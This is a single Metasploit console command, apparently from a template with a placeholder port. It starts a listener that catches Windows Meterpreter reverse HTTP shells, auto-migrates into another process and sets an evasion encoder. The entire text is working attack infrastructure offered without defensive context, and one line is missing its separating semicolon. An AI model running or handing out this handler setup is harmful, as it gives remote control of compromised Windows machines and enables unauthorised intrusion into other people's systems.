msfconsole -q -x 'use exploit/multi/handler;
set LHOST 0.0.0.0;
set LPORT §LPORT§;
set LURI /meterpreter
set PAYLOAD windows/meterpreter_reverse_http;
set AutoRunScript windows/manage/migrate;
set StageEncoder x86/shikata_ga_nai;
run'
